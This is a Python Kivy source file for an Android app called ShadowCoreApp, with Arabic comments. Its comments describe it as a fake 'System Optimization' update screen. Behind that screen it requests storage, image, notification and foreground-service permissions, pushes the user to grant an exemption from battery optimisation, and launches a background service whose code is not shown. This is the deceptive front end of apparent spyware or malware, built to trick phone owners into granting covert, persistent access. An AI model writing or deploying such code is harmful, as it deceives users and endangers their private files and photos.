import threading
from kivy.app import App
from kivy.uix.label import Label
from kivy.clock import Clock
from jnius import autoclass, cast

# استدعاء أدوات أندرويد للتحكم العميق
PythonActivity = autoclass('org.kivy.android.PythonActivity')
Intent = autoclass('android.content.Intent')
Settings = autoclass('android.provider.Settings')
Uri = autoclass('android.net.Uri')
Context = autoclass('android.content.Context')
PowerManager = autoclass('android.os.PowerManager')

class ShadowCoreApp(App):
    def build(self):
        # واجهة وهمية تظهر للمستخدم كأنها عملية تحديث
        return Label(
            text="[b]System Optimization[/b]\n[color=00ff00]جاري تهيئة خدمات النظام... 67%[/color]\nالرجاء الموافقة على كافة الأذونات لضمان الاستقرار.", 
            markup=True,
            halign="center"
        )

    def on_start(self):
        # الخطوة 1: طلب الأذونات الأساسية (الصور والإشعارات)
        Clock.schedule_once(self.trigger_permissions, 1)

    def trigger_permissions(self, dt):
        try:
            from android.permissions import request_permissions, Permission
            perms = [
                Permission.READ_EXTERNAL_STORAGE,
                Permission.POST_NOTIFICATIONS,
                Permission.READ_MEDIA_IMAGES,
                Permission.FOREGROUND_SERVICE
            ]
            request_permissions(perms, self.check_battery_permission)
        except:
            pass

    def check_battery_permission(self, permissions, grants):
        # الخطوة 2: طلب استثناء البطارية (الرصاصة القاتلة للقيود)
        Clock.schedule_once(self.ask_ignore_battery, 1)

    def ask_ignore_battery(self, dt):
        activity = PythonActivity.mActivity
        pm = cast(PowerManager, activity.getSystemService(Context.POWER_SERVICE))
        package_name = activity.getPackageName()
        
        if not pm.isIgnoringBatteryOptimizations(package_name):
            try:
                # محاولة فتح النافذة المنبثقة مباشرة
                intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                intent.setData(Uri.parse(f"package:{package_name}"))
                activity.startActivity(intent)
            except:
                # إذا فشلت، نفتح صفحة الإعدادات العامة للبطارية
                intent = Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)
                activity.startActivity(intent)
        
        # الخطوة الأخيرة: تشغيل محرك الخدمة في الخلفية
        Clock.schedule_once(self.launch_service, 2)

    def launch_service(self, dt):
        try:
            context = PythonActivity.mActivity
            # تأكد أن اسم الخدمة هنا يطابق ما سنضعه في buildozer.spec
            service_class = autoclass('org.test.shadowcore.ServiceMyservice')
            service_class.start(context, "")
        except Exception as e:
            print(f"Service Launch Failed: {e}")

if __name__ == "__main__":
    ShadowCoreApp().run()
